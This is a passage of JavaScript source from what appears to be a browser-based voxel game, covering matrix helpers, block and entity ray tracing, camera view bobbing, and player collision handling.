			for(let i=0; i<this.matrices.length; i++){
				gl.bindFramebuffer(gl.FRAMEBUFFER, shadowMapFB[i])
				gl.clear(gl.DEPTH_BUFFER_BIT)
			}
			gl.bindFramebuffer(gl.FRAMEBUFFER, null)
		}
	}
	function vectorMultMatrix(v,matrix,vw=1){
		let x = v.x*matrix[0] + v.y*matrix[4] + v.z*matrix[8] + vw*matrix[12]
		let y = v.x*matrix[1] + v.y*matrix[5] + v.z*matrix[9] + vw*matrix[13]
		let z = v.x*matrix[2] + v.y*matrix[6] + v.z*matrix[10] + vw*matrix[14]
		let w = v.x*matrix[3] + v.y*matrix[7] + v.z*matrix[11] + vw*matrix[15]
		v.set(x/w,y/w,z/w)
	}
	win.vectorMultMatrix = vectorMultMatrix
	function vectorMultMatrixTranspose(v,matrix,vw=1){
		let x = v.x*matrix[0] + v.y*matrix[1] + v.z*matrix[2] + vw*matrix[3]
		let y = v.x*matrix[4] + v.y*matrix[5] + v.z*matrix[6] + vw*matrix[7]
		let z = v.x*matrix[8] + v.y*matrix[9] + v.z*matrix[10] + vw*matrix[11]
		let w = v.x*matrix[12] + v.y*matrix[13] + v.z*matrix[14] + vw*matrix[15]
		v.set(x/w,y/w,z/w)
	}
	function vectorMultMatrixWithW(v,matrix,vw=1){
		let x = v.x*matrix[0] + v.y*matrix[4] + v.z*matrix[8] + vw*matrix[12]
		let y = v.x*matrix[1] + v.y*matrix[5] + v.z*matrix[9] + vw*matrix[13]
		let z = v.x*matrix[2] + v.y*matrix[6] + v.z*matrix[10] + vw*matrix[14]
		let w = v.x*matrix[3] + v.y*matrix[7] + v.z*matrix[11] + vw*matrix[15]
		v.set(x,y,z)
		return w
	}
	win.vectorMultMatrixTranspose = vectorMultMatrixTranspose
	function initModelView(camera, x, y, z, rx, ry, sx, sy) {
		if (camera) {
			camera.transform()
			uniformMatrix("view3d", program3D, "uView", false, camera.getMatrix())
		} else {
			copyArr(defaultModelView, modelView)
			rotX(modelView, rx)
			rotY(modelView, ry)
			trans(modelView, -x, -y, -z)
      if(sy){
        scale(modelView,sx,sy,1)
      }else{
        scale(modelView, sx,sx,1)
      }
			matMult()
			transpose(matrix)
			uniformMatrix("view3d", program3D, "uView", false, matrix)
		}
	}
  win.initModelView = initModelView

	function timeString(millis) {
		if (millis > 300000000000 || !millis) {
			return "never"
		}
		const SECOND = 1000
		const MINUTE = SECOND * 60
		const HOUR = MINUTE * 60
		const DAY = HOUR * 24
		const YEAR = DAY * 365

		let years = floor(millis / YEAR)
		millis -= years * YEAR

		let days = floor(millis / DAY)
		millis -= days * DAY

		let hours = floor(millis / HOUR)
		millis -= hours * HOUR

		let minutes = floor(millis / MINUTE)
		millis -= minutes * MINUTE
		
		let seconds = floor(millis / SECOND)

		if (years) {
			return `${years} year${years > 1 ? "s" : ""} and ${days} day${days !== 1 ? "s" : ""} ago`
		}
		if (days) {
			return `${days} day${days > 1 ? "s" : ""} and ${hours} hour${hours !== 1 ? "s" : ""} ago`
		}
		if (hours) {
			return `${hours} hour${hours > 1 ? "s" : ""} and ${minutes} minute${minutes !== 1 ? "s" : ""} ago`
		}
		if(minutes) {
			return `${minutes} minute${minutes > 1 ? "s" : ""} ago`
		}
		return `${seconds} second${seconds > 1 ? "s" : ""} ago`
	}
	function showProgressFromResponse(response,progress){
		let loaded = 0
		const contentLength = response.headers.get('content-length');
  	const total = parseInt(contentLength, 10);
		return new Response(new ReadableStream({
			async start(controller) {
				const reader = response.body.getReader();
				while(true) {
					const {done, value} = await reader.read();
					if (done) break;
					loaded += value.byteLength;
					progress(loaded, total)
					controller.enqueue(value);
				}
				controller.close();
			},
		}));
	}
	function formatBytes(bytes, decimals = 2) { //from https://web.archive.org/web/20120507054320/http://codeaid.net/javascript/convert-size-in-bytes-to-human-readable-format-(javascript)
    if (!+bytes) return '0 Bytes'

    const k = 1024
    const dm = decimals < 0 ? 0 : decimals
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']

    const i = Math.floor(Math.log(bytes) / Math.log(k))

    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
	}
	function roundBits(number) {
		return ((number * 1000000 + 0.5) | 0) / 1000000
	}
	function rayTrace(x, y, z, shape, noOffset) {
		let cf, cd = 1e9, cix, ciy, ciz; //Closest face and distance
		let m; //Absolute distance to intersection point
		let ix, iy, iz; //Intersection coords
		let minX, minY, minZ, maxX, maxY, maxZ, min, max; //Bounds of face coordinates
		let east = p.direction.x < 0
		let top = p.direction.y < 0
		let north = p.direction.z < 0
		let verts = shape.verts
		let faces = verts[0]
    noOffset = noOffset ? 0 : 1
    let px = p.x + p.cOffsetX * noOffset, py = p.y + p.cOffsetY * noOffset, pz = p.z + p.cOffsetZ * noOffset

		//Top and bottom faces

		if (top) {
			faces = verts[1]
		}
		if (p.direction.y) {
			for (let face of faces) {
				min = face.min
				minX = min[0]
				minZ = min[2]
				max = face.max
				maxX = max[0]
				maxZ = max[2]
				m = (y + face[1] - py) / p.direction.y
				ix = m * p.direction.x + px
				iz = m * p.direction.z + pz
				if (m > 0 && m < cd && ix >= x + minX && ix <= x + maxX && iz >= z + minZ && iz <= z + maxZ) {
					cd = m; //Ray crosses bottom face
					cf = top ? "top" : "bottom"
          cix = ix - px
          ciy = m * p.direction.y
          ciz = iz - pz
				}
			}
		}

		//West and East faces
		if (east) {
			faces = verts[4]
		} else {
			faces = verts[5]
		}
		if (p.direction.x) {
			for (let face of faces) {
				min = face.min
				minY = min[1]
				minZ = min[2]
				max = face.max
				maxY = max[1]
				maxZ = max[2]
				m = (x + face[0] - px) / p.direction.x
				iy = m * p.direction.y + py
				iz = m * p.direction.z + pz
				if (m > 0 && m < cd && iy >= y + minY && iy <= y + maxY && iz >= z + minZ && iz <= z + maxZ) {
					cd = m
					cf = east ? "east" : "west"
          cix = m * p.direction.x
          ciy = iy - py
          ciz = iz - pz
				}
			}
		}

		//South and North faces
		if (north) {
			faces = verts[2]
		} else {
			faces = verts[3]
		}
		if (p.direction.z) {
			for (let face of faces) {
				min = face.min
				minX = min[0]
				minY = min[1]
				max = face.max
				maxX = max[0]
				maxY = max[1]
				m = (z + face[2] - pz) / p.direction.z
				ix = m * p.direction.x + px
				iy = m * p.direction.y + py
				if (m > 0 && m < cd && ix >= x + minX && ix <= x + maxX && iy >= y + minY && iy <= y + maxY) {
					cd = m
					cf = north ? "north" : "south"
          cix = ix - px
          ciy = iy - py
          ciz = m * p.direction.z
				}
			}
		}
		return [ cd, cf, cix,ciy,ciz ]
	}
  function entityRayTrace(x,y,z,w,h,d, noOffset){
    let cf, cd = 1e9; //Closest face and distance
		let m; //Absolute distance to intersection point
		let ix, iy, iz; //Intersection coords
		let minX, minY, minZ, maxX, maxY, maxZ, face; //Bounds of face coordinates
    let w2 = w/2, h2 = h/2, d2 = d/2
		let east = p.direction.x < 0
		let top = p.direction.y < 0
		let north = p.direction.z < 0
    noOffset = noOffset ? 0 : 1
    let px = p.x + p.cOffsetX * noOffset, py = p.y + p.cOffsetY * noOffset, pz = p.z + p.cOffsetZ * noOffset
    
    if (p.direction.y) {
      minX = -w2
      minZ = -d2
      maxX = w2
      maxZ = d2
      if(top){
        face = h2
      }else{
        face = -h2
      }
      m = (y + face - py) / p.direction.y
      ix = m * p.direction.x + px
      iz = m * p.direction.z + pz
      if (m > 0 && m < cd && ix >= x + minX && ix <= x + maxX && iz >= z + minZ && iz <= z + maxZ) {
        cd = m; //Ray crosses bottom face
        cf = top ? "top" : "bottom"
      }
    }
    if (p.direction.x) {
      minY = -h2
      minZ = -d2
      maxY = h2
      maxZ = d2
      if(east){
        face = w2
      }else{
        face = -w2
      }
      m = (x + face - px) / p.direction.x
      iy = m * p.direction.y + py
      iz = m * p.direction.z + pz
      if (m > 0 && m < cd && iy >= y + minY && iy <= y + maxY && iz >= z + minZ && iz <= z + maxZ) {
        cd = m
        cf = east ? "east" : "west"
      }
    }
    if (p.direction.z) {
      minX = -w2
      minY = -h2
      maxX = w2
      maxY = h2
      if(north){
        face = d2
      }else{
        face = -d2
      }
      m = (z + face - pz) / p.direction.z
      ix = m * p.direction.x + px
      iy = m * p.direction.y + py
      if (m > 0 && m < cd && ix >= x + minX && ix <= x + maxX && iy >= y + minY && iy <= y + maxY) {
        cd = m
        cf = north ? "north" : "south"
      }
    }
    return [ cd, cf ]
  }
  function runEntityRayTrace(){
    entHitbox.closest = settings.reach
    var dimension = p.dimension
		//world.getEntitiesNear(p.x+p.cOffsetX,p.y+p.cOffsetY,p.z+p.cOffsetZ,dimension, settings.renderDistance*16, nearEntityArray)
    for(let [id,ent] of world.entities){
      if(ent.dimension !== dimension || ent.noHitbox || ent.hidden) continue
      let c = entityRayTrace(ent.x,ent.y,ent.z,ent.width,ent.height,ent.depth, p.thirdPerson)
      if(c[0] < entHitbox.closest){
        entHitbox.closest = c[0]
        entHitbox.face = c.cf
        entHitbox.ent = ent
      }
    }
    if(multiplayer){
      for(var i in players){
        var ent = players[i]
        if(ent.dimension !== dimension || ent.hidden) continue
        let c = entityRayTrace(ent.x,ent.y,ent.z,ent.width,ent.height,ent.depth, p.thirdPerson)
        if(c[0] < entHitbox.closest){
          entHitbox.closest = c[0]
          entHitbox.player = true
          entHitbox.face = c.cf
          entHitbox.ent = ent
        }
      }
    }
  }
	function runRayTrace(x, y, z) {
		let block = world.getBlock(x, y, z, p.dimension)
		if (block && !(blockData[block].noHitbox && !(holding && blockData[holding].allHitbox))) {
			let shape = blockData[block].shape
      if(shape.hitbox) shape = shape.hitbox
			let rt = rayTrace(x, y, z, shape, p.thirdPerson)

			if (rt[1] && rt[0] < hitBox.closest) {
				hitBox.closest = rt[0]
				hitBox.face = rt[1]
				hitBox.pos = [ x, y, z ]
				hitBox.shape = shape
			}
		}
	}
  function runCameraRayTrace(x, y, z) {
		let block = world.getBlock(x, y, z, p.dimension)
		if (block && blockData[block].solid) {
			let shape = blockData[block].shape
      if(shape.hitbox) shape = shape.hitbox
			let rt = rayTrace(x, y, z, shape, true)

			if (rt[1] && rt[0] < p.offsetDist) {
				p.offsetDist = rt[0]
        p.cOffsetX = rt[2]
        p.cOffsetY = rt[3]
        p.cOffsetZ = rt[4]
        p.cOffsetFound = true
			}
		}
	}
	function lookingAt() {
		// Checks blocks in front of the player to see which one they're looking at
		hitBox.pos = null
		hitBox.closest = 1e9
    entHitbox.ent = null
    entHitbox.player = false
    if(!cheats) settings.reach = 5
		let reach = settings.reach

		let blockState = world.getBlock(p2.x, p2.y, p2.z, p.dimension)
		/*if (blockState && !(blockData[blockState].noHitbox && !(holding && blockData[holding].allHitbox))) {
			hitBox.pos = [ p2.x, p2.y, p2.z ]
			hitBox.closest = 0
			hitBox.shape = blockData[blockState].shape
      if(hitBox.shape.hitbox) hitBox.shape = hitBox.shape.hitbox
			return
		}*/

		let pd = p.direction

    let doOffset = p.thirdPerson ? 0 : 1
    let x = p.x + p.cOffsetX * doOffset, y = p.y + p.cOffsetY * doOffset, z = p.z + p.cOffsetZ * doOffset
		// Target block
		let tx = round(pd.x * reach + x)
		let ty = round(pd.y * reach + y)
		let tz = round(pd.z * reach + z)

		let minX = round(x)
		let maxX = 0
		let minY = round(y)
		let maxY = 0
		let minZ = round(z)
		let maxZ = 0

    runEntityRayTrace()
		for (let i = 0; i < reach + 1; i++) {
			if (i > reach) {
				i = reach
			}
			maxX = round(x + pd.x * i)
			maxY = round(y + pd.y * i)
			maxZ = round(z + pd.z * i)
			if (maxX === minX && maxY === minY && maxZ === minZ) {
				continue
			}
			if (minX !== maxX) {
				if (minY !== maxY) {
					if (minZ !== maxZ) {
						runRayTrace(maxX, maxY, maxZ)
					}
					runRayTrace(maxX, maxY, minZ)
				}
				if (minZ !== maxZ) {
					runRayTrace(maxX, minY, maxZ)
				}
				runRayTrace(maxX, minY, minZ)
			}
			if (minY !== maxY) {
				if (minZ !== maxZ) {
					runRayTrace(minX, maxY, maxZ)
				}
				runRayTrace(minX, maxY, minZ)
			}
			if (minZ !== maxZ) {
				runRayTrace(minX, minY, maxZ)
			}
			if (hitBox.pos) {
        if(entHitbox.ent && entHitbox.closest < hitBox.closest) hitBox.pos = null
				else entHitbox.ent = null
				break; //The ray has collided; it can't possibly find a closer collision now
			}
			minZ = maxZ
			minY = maxY
			minX = maxX
		}
	}
  function setCameraOffset(){
    p.pCOffsetX = p.cOffsetX
    p.pCOffsetY = p.cOffsetY
    p.pCOffsetZ = p.cOffsetZ
    p.cOffsetX = p.cOffsetZ = 0
		let cameraEnt = p.spectating || p
		let hsize = 0.25*cameraEnt.scale*cameraEnt.actualSize
		p.cOffsetY = cameraEnt.swimming || cameraEnt.type !== "Player" ? 0 : cameraEnt.offsetY+cameraEnt.parts.head.y*p.scale*p.actualSize+hsize//p.height*0.5-pTopH*p.scale
    p.offsetDist = 1e9
    p.cOffsetFound = false
    if(!p.thirdPerson && !performFast && cameraEnt.type === "Player" && !p.spectator){
      let diff = (now - p.lastUpdate) / tickTime
      if (diff > 1) diff = 1
      let rx = lerp(diff,p.prx,p.rx)
      let ry = lerp(diff,p.pry,p.ry)
      if(!p.thirdPerson){
        if(p.sleeping){
					getRotation(-Math.PI,ry)
					p.cOffsetX += node.x*hsize*1.5
          p.cOffsetY += node.y*hsize*1.5
          p.cOffsetZ += node.z*hsize*1.5
				}else{
          if(p.swimming){
            let d = p.direction
            p.cOffsetX += d.x*hsize*1.5
            p.cOffsetY += d.y*hsize*1.5
            p.cOffsetZ += d.z*hsize*1.5
          }else p.cOffsetY -= hsize
          getRotation(rx+Math.PI2,ry)
          p.cOffsetX += node.x*hsize
          p.cOffsetY += node.y*hsize
          p.cOffsetZ += node.z*hsize
        }
        calcPd()
        p.cOffsetX += p.direction.x*hsize
        p.cOffsetY += p.direction.y*hsize
        p.cOffsetZ += p.direction.z*hsize
      }

      let intensity = 0.0625//0.09375
      prevViewBobIntensity = viewBobIntensity
			p.camera.pViewBobRz = p.camera.viewBobRz
			p.camera.pViewBobRx = p.camera.viewBobRx
			p.camera.viewBobRz = 0
			p.camera.viewBobRx = 0
      if(!p.thirdPerson && !p.sleeping){
        //view bobbing
				let bobSpeed = dist2(p.x,p.z,p.previousX,p.previousZ)*500
        if(p.walking && !p.swimming && p.onGround && bobSpeed>25){
          if(!prevViewBob){
            prevViewBob = true
            //if(!viewBobIntensity) viewBobCount = lastViewBobCount = lerp(min(abs(move.x),1),Math.random()*2-1,move.x) > 0 ? 500 : -500
          }
          if(viewBobIntensity < 5){
            viewBobIntensity = 5
						//if(viewBobIntensity>5) viewBobIntensity = 5
          }
        }else{
          if(prevViewBob){
            prevViewBob = false
          }
          if(viewBobIntensity > 0){
            viewBobIntensity -= 0.5
						if(viewBobIntensity<0) viewBobIntensity = 0
          }
        }
        const intensityMult = lerp(min((now-lastTick)/tickTime,1),prevViewBobIntensity,viewBobIntensity)/5
				intensity *= intensityMult*intensityMult
        if(intensity){
          lastViewBobCount = viewBobCount
					viewBobCount = p.walkCount
					/*if(intensityMult === 1){
						//if(p.sprinting) viewBobCount += 100
						//else viewBobCount += 50//62.5
						viewBobCount += bobSpeed
					}*/
          let counter = lerp(min((now-lastTick)/tickTime,1),lastViewBobCount,viewBobCount)
					let angle = counter/1000*Math.PI
					let s = sin(angle)*intensity
					p.cOffsetX += s*0.5*cos(p.ry)
					p.cOffsetZ += s*0.5*sin(p.ry)
					p.cOffsetY += (1-abs(cos(angle)))*intensity
					p.camera.viewBobRx += (1-abs(cos(angle+0.2)))*intensity*5*Math.PI/180
					p.camera.viewBobRz = s*3*Math.PI/180
					/*let angle = counter/1000*Math.PI, c = cos(angle), oy = abs(sin(angle))-1
					p.cOffsetY += oy*intensity
					p.cOffsetX += cos(p.ry)*c*intensity
					p.cOffsetZ += sin(p.ry)*c*intensity
					p.camera.viewBobRz = oy*Math.sign(c)*Math.PI/-32*intensity
					p.camera.viewBobRx += oy*Math.PI/256*/
          /*let bob = (counter%1000)/500
          if(bob>1) bob = 2-bob
					else bob = bob
					bob = ((bob*2-1)**2*Math.sign(bob*2-1) *0.5+0.5 +bob)/2
          let brx = bob*Math.PI
          getRotation(brx,ry+Math.PI2)
          p.cOffsetX += node.x*intensity
          p.cOffsetY += node.y*intensity
          p.cOffsetZ += node.z*intensity
					//p.camera.viewBobRz = sin(counter*Math.PI/500)*Math.PI2/48*intensity
					p.camera.viewBobRz = (bob-0.5)*Math.PI/24*intensity//(abs((counter%1000)-500)-250)*/
        }
				let dnow = Date.now()
				if(!p.swimming && !p.flying){
					p.camera.viewBobRx += p.velocity.y/p.jumpSpeed*Math.PI/128
					//let effect = max(1-((dnow-p.lastJump)/400)**2,0)
					//p.camera.viewBobRx = lerp(0.5,p.camera.viewBobRx, max(1-p.velocity.y/p.jumpSpeed,0)*Math.PI/48 * effect)
					//if(amount>p.camera.viewBobRx) p.camera.viewBobRx = lerp(0.25, p.camera.viewBobRx, amount)  //sin((dnow-p.lastJump)*Math.PI/500)*Math.PI/64
				}
				//if(p.camera.viewBobRx>0.002*Math.PI) p.camera.viewBobRx *= 0.8
				//else p.camera.viewBobRx = 0
      }
			p.cOffsetX *= p.scale, p.cOffsetY *= p.scale, p.cOffsetZ *= p.scale
      return
    }
    
    let pd = p.direction

		let minX = p2.x
		let maxX = 0
		let minY = p2.y
		let maxY = 0
		let minZ = p2.z
		let maxZ = 0
    if(p.thirdPerson){ //Make sure the camera doesn't go through blocks
      if(p.thirdPerson === true){
        pd.x = -pd.x
        pd.y = -pd.y
        pd.z = -pd.z
      }
      p.cOffsetX = pd.x*thirdPersonReach, p.cOffsetY = pd.y*thirdPersonReach, p.cOffsetZ = pd.z*thirdPersonReach
      for (let i = 0; i < thirdPersonReach+1; i++) {
        if (i > thirdPersonReach) {
          i = thirdPersonReach
        }
        maxX = round(p.x + pd.x * i)
        maxY = round(p.y + pd.y * i)
        maxZ = round(p.z + pd.z * i)
        if (maxX === minX && maxY === minY && maxZ === minZ) {
          continue
        }
        if (minX !== maxX) {
          if (minY !== maxY) {
            if (minZ !== maxZ) runCameraRayTrace(maxX, maxY, maxZ)
            runCameraRayTrace(maxX, maxY, minZ)
          }
          if (minZ !== maxZ) runCameraRayTrace(maxX, minY, maxZ)
          runCameraRayTrace(maxX, minY, minZ)
        }
        if (minY !== maxY) {
          if (minZ !== maxZ) runCameraRayTrace(minX, maxY, maxZ)
          runCameraRayTrace(minX, maxY, minZ)
        }
        if (minZ !== maxZ) {
          runCameraRayTrace(minX, minY, maxZ)
        }
        if (p.cOffsetFound) break
        minZ = maxZ
        minY = maxY
        minX = maxX
      }
      if(p.thirdPerson === true){
        pd.x = -pd.x
        pd.y = -pd.y
        pd.z = -pd.z
      }
    }
  }
	let inBox = function(x, y, z, w, h, d) {
		let iy = y - h/2 - p.height*0.5
		let ih = h + p.height
		let ix = x - w/2 - p.width*0.5
		let iw = w + p.width
		let iz = z - d/2 - p.depth*0.5
		let id = d + p.depth
		return p.x > ix && p.y > iy && p.z > iz && p.x < ix + iw && p.y < iy + ih && p.z < iz + id
	}
	let onBox = function(x, y, z, w, h, d) {
		let iy = y - h/2 - p.height*0.5
		let ih = h + p.height
		let ix = x - w/2 - p.width*0.5
		let iw = w + p.width
		let iz = z - d/2 - p.depth*0.5
		let id = d + p.depth
		return p.x > ix && p.y > iy && p.z > iz && p.x < ix + iw && p.y <= iy + ih && p.z < iz + id
	}
  let touchingBox = function(x, y, z, w, h, d) {
		let iy = y - h/2 - p.height*0.5 - 0.1
		let ih = h + p.height + 0.2
		let ix = x - w/2 - p.width*0.5 - 0.1
		let iw = w + p.width + 0.2
		let iz = z - d/2 - p.depth*0.5 - 0.1
		let id = d + p.depth + 0.2
		return p.x > ix && p.y > iy && p.z > iz && p.x < ix + iw && p.y < iy + ih && p.z < iz + id
	}
  let takeDamage
	function collided(x, y, z, vx, vy, vz, block, entity, steps) {
		if(p.spectator) {
			return false
		}
    
    let shape = blockData[block].shape
    if(shape.hitbox) shape = shape.hitbox
		let verts = shape.verts
    let blockObj = blockData[block]
		let px = p.x - p.width*0.5 - x
		let py = p.y - p.height*0.5 - y
		let pz = p.z - p.depth*0.5 - z
		let pxx = p.x + p.width*0.5 - x
		let pyy = p.y + p.height*0.5 - y
		let pzz = p.z + p.depth*0.5 - z
		let minX, minY, minZ, maxX, maxY, maxZ, min, max
    let stuckInBlock = p.blockHere && p.survival

		//Top and bottom faces
		let faces = verts[0]
		if (vy <= 0) {
			faces = verts[1]
		}
		if (vx === null && vz === null) {
      let col = false
			for (let face of faces) {
				min = face.min
				minX = min[0]
				minZ = min[2]
				max = face.max
				maxX = max[0]
				maxZ = max[2]
				if (face[1] > py && face[1] < pyy && minX < pxx && maxX > px && minZ < pzz && maxZ > pz) {
          col = true
          p.velocity.y = 0
					if (vy <= 0) {
						p.onGround = true
						if(!stuckInBlock) p.y = face[1] + y + p.height*0.5; else p.y = p.previousY
					} else {
            //if(blockObj.damage > takeDamage){
              //takeDamage = blockObj.damage
            //}
            if(!stuckInBlock) p.y = face[1] + y - p.height*0.5; else p.y = p.previousY
					}
				}
			}
			return col
		}

		//West and East faces
		if (vx < 0) {
			faces = verts[4]
		} else if (vx > 0) {
			faces = verts[5]
		}
		if (vx !== null) {
			let col = false
			for (let face of faces) {
				min = face.min
				minZ = min[2]
				minY = min[1]
				max = face.max
				maxZ = max[2]
				maxY = max[1]
				if (face[0] > px && face[0] < pxx && minY < pyy && maxY > py && minZ < pzz && maxZ > pz) {
					if (maxY - py > 0.5 || !p.onGround) {
						p.canStepX = false
            if(!stuckInBlock) p.x = x + face[0] + (vx < 0 ? p.width*0.5 : -p.width*0.5); else p.x = p.previousX
            p.velocity.x = 0
					}
					col = true
          //if(blockObj.damage > takeDamage){
            //takeDamage = blockObj.damage
          //}
				}
			}
			return col
		}

		//South and North faces
		if (vz < 0) {
			faces = verts[2]
		} else if (vz > 0) {
			faces = verts[3]
		}
		if (vz !== null) {
			let col = false
			for (let face of faces) {
				min = face.min
				minX = min[0]
				minY = min[1]
				max = face.max
				maxX = max[0]
				maxY = max[1]
				if (face[2] > pz && face[2] < pzz && minY < pyy && maxY > py && minX < pxx && maxX > px) {
					if (maxY - py > 0.5 || !p.onGround) {
						p.canStepZ = false
            if(!stuckInBlock) p.z = z + face[2] + (vz < 0 ? p.depth*0.5 : -p.depth*0.5); else p.z = p.previousZ
            p.velocity.z = 0
					}
					col = true
          //if(blockObj.damage > takeDamage){
            //takeDamage = blockObj.damage
          //}
				}
			}
			return col
		}
	}
	let nearEntityArray = [] //Temporary, for getEntitiesNear
	let contacts = {
		array: [],
		size: 0,
		add: function(x, y, z, block, data) {
			if (this.size === this.array.length) {
				this.array.push([ x, y, z, block, data ])
			} else {
				this.array[this.size][0] = x
				this.array[this.size][1] = y
				this.array[this.size][2] = z
				this.array[this.size][3] = block
        this.array[this.size][4] = data
			}
			this.size++
		},
		clear: function() {
			this.size = 0
		},
	}
  let blocks = []
  let bounce = 0
	let resolveContactsAndUpdatePosition = function(now) {
		let steps = ceil(max(abs(p.velocity.x),abs(p.velocity.y),abs(p.velocity.z), 1))
		const VX = p.velocity.x / steps
		const VY = p.velocity.y / steps
		const VZ = p.velocity.z / steps
		let pminX = floor(p.x - p.width*0.5 - 1)
		let pmaxX = ceil(p.x + p.width*0.5 + 1)
		let pminY = floor(p.y - p.height*0.5 - 1)
		let pmaxY = ceil(p.y + p.height*0.5 + 1)
		let pminZ = floor(p.z - p.depth*0.5 - 1)
		let pmaxZ = ceil(p.z + p.depth*0.5 + 1)
		let block = null
		let vel = p.velocity
    let blocksSize = 0
    let d = p.dimension
    bounce = 0
    let pvy = vel.y
    
		for (let x = pminX; x <= pmaxX; x++) {
			for (let y = pminY; y <= pmaxY; y++) {
				for (let z = pminZ; z <= pmaxZ; z++) {
					let block = world.getBlock(x, y, z, d)
					if (block && blockData[block].solid) {
						contacts.add(x, y, z, block)
					}
          if (block) {
            if(blocks[blocksSize]){
              blocks[blocksSize][0] = x
              blocks[blocksSize][1] = y
              blocks[blocksSize][2] = z
              blocks[blocksSize][3] = block
            }else{
              blocks.push([x,y,z,block])
            }
            blocksSize ++
          }
				}
			}
		}
		
		world.getEntitiesNear(p.x,p.y,p.z,p.dimension,p.width*0.5+1, nearEntityArray)
		for(let e of nearEntityArray) {
			if(e.canStandOn && e.block && e.x > pminX && e.x < pmaxX && e.y > pminY && e.y < pmaxY && e.z > pminZ && e.z < pmaxZ) {
				contacts.add(e.x, e.y, e.z, e.block, e)
			}
		}
		if(weather === "rain" && weatherAmount > 0.5){
			let top = world.getSolidTop(round(p.x),round(p.z),p.dimension)
			if(p.y > top) wet = true
		}
    let hasCollided = false
    
    p.blockHereSolid = p.blockHere && blockData[p.blockHere].solid ? true : false

    let ontouch, closestTouch = Infinity
		let touchX, touchY, touchZ
    let damageX = 0, damageY = 0, damageZ = 0
		let damageBlockAmount = 0
    let damageBlock
    takeDamage = 0
    liquid = false
    wet = false
    powder = false
    spikyBush = false
    quicksand = false
    //collisions for ontouch
    for (let i = 0; i < blocksSize; i++) {
			block = blocks[i]
      let x = block[0], y = block[1], z = block[2]
      /*if(touchingBox(x,y,z,1,1,1)){
        let d = blockData[block[3]].damage
				if(typeof d === "function") d = d(x,y,z,p.dimension)
        if(d && d>takeDamage) {
          takeDamage = d
          damageBlock = blockData[block[3]]
        }
				if(d){
					damageX += x*d
					damageY += y*d
					damageZ += z*d
					damageBlockAmount+=d
				}
      }
			if(onBox(x,y,z,1,1,1)){
				let d = blockData[block[3]].damageUp
        if(d && d>takeDamage) {
          takeDamage = d
          damageBlock = blockData[block[3]]
        }
				if(d){
					damageX += x*d
					damageY += y*d
					damageZ += z*d
					damageBlockAmount+=d
				}
			}
      
      if(blockData[block[3]].activate){
        blockData[block[3]].activate(x,y,z,p.dimension,block[3],p)
      }*/
      if(!inBox(x,y,z,1,1,1)) continue
      /*if(!p.spectator && blockData[block[3]].ontouch){
        ontouch = blockData[block[3]].ontouch
				touchX = x, touchY = y, touchZ = z
      }*/
      if(blockData[block[3]].liquid) {
        liquid = true
      }
      if(blockData[block[3]].wet){
        wet = true
      }
      if(blockData[block[3]].getCurrent && !p.spectator){
        var me = blockData[block[3]]
        var c = me.getCurrent(x,y,z,undefined,undefined,world)
        p.velocity.x += (c.x||0)/64
        p.velocity.z += (c.z||0)/64
        var under = world.getBlock(x,y-1,z,p.dimension)
        if(me.isThis(under) && under !== me.id) p.velocity.y -= 1/128
      }
      if(!blockData[block[3]].solid && blockData[block[3]].powder){
        powder = true
      }
      if(blockData[block[3]].spikyBush){
        spikyBush = true
      }
      if(blockData[block[3]].quicksand){
        quicksand = true
      }
			if(blockData[block[3]].ontouch){
				let dist = max(abs(x-p.x),abs(z-p.z),abs(y-p.y))
				if(dist<closestTouch){
					closestTouch = dist
					ontouch = blockData[block[3]].ontouch
					touchX = x, touchY = y, touchZ = z
				}
			}
		}
    
		let maxpushX = 0, minpushX = 0, maxpushY = 0, minpushY = 0, maxpushZ = 0, minpushZ = 0
    for (let j = 1; j <= steps; j++) {
      let px = p.x, pz = p.z, py = p.y
      
      //Check collisions in the Y direction
      p.onGround = false
      p.canStepX = false
      p.canStepZ = false
      p.y += VY
      for (let i = 0; i < contacts.size; i++) {
        block = contacts.array[i]
        let x = block[0], y = block[1], z = block[2], vy = VY, thispush = 0
        if(block[4]){//a moving entity
          x = block[4].previousX
          z = block[4].previousZ
          vy -= (block[4].y-block[4].previousY)/steps
					y = lerp(j/steps,block[4].previousY,y)
					thispush = block[4].vely
        }
        if (collided(x, y, z, null, vy, null, block[3],block[4],steps)) {
					hasCollided = true
          if(blockData[block[3]].bounciness){
						thispush -= (VY*steps-thispush)*blockData[block[3]].bounciness
          }
					maxpushY = max(maxpushY,thispush)
					minpushY = min(minpushY,thispush)
          //break
        }
      }
      if (p.onGround) {
        p.canStepX = true
        p.canStepZ = true
      }

      var sneakLock = false, sneakSafe = false
      if (p.sneaking) {
        for (let i = 0; i < contacts.size; i++) {
          block = contacts.array[i]
          if (onBox(block[0], block[1], block[2], 1, 1, 1)) {
            sneakLock = true
            break
          }
        }
      }

      //Check collisions in the X direction
      p.x += VX
      for (let i = 0; i < contacts.size; i++) {
        block = contacts.array[i]
        let x = block[0], y = block[1], z = block[2], vx = VX, thispush = 0
        if(block[4]){//a moving entity
          z = block[4].previousZ
          vx -= (block[4].x-block[4].previousX)/steps
					x = lerp(j/steps,block[4].previousX,x)
					thispush = block[4].velx
        }
        if (collided(x, y, z, vx, null, null, block[3],block[4],steps)) {
          if (p.canStepX && !world.getBlock(block[0], block[1] + 1, block[2], d) && !world.getBlock(block[0], block[1] + 2, block[2], d)) {
            continue
          }
					hasCollided = true
          if(blockData[block[3]].bounciness){
						thispush -= (VX*steps-thispush)*blockData[block[3]].bounciness
          }
					maxpushX = max(maxpushX,thispush)
					minpushX = min(minpushX,thispush)
          /*if(block[4] && block[4].velx){
            if(block[4].velx < 0 && vel.x > block[4].velx) vel.x = block[4].velx
            if(block[4].velx > 0 && vel.x < block[4].velx) vel.x = block[4].velx
          }*/
          //break
        }
        if (sneakLock && onBox(block[0], block[1], block[2], 1, 1, 1)) {
          sneakSafe = true
        }
      }

      if (sneakLock && !sneakSafe) {
        p.x = px
        vel.x = 0
				hasCollided = true
      }
      sneakSafe = false

      //Check collisions in the Z direction
      p.z += VZ
      for (let i = 0; i < contacts.size; i++) {
        block = contacts.array[i]
        let x = block[0], y = block[1], z = block[2], vz = VZ, thispush = 0
        if(block[4]){//a moving entity
          vz -= (block[4].z-block[4].previousZ)/steps
					z = lerp(j/steps,block[4].previousZ,z)
					thispush = block[4].velz
        }
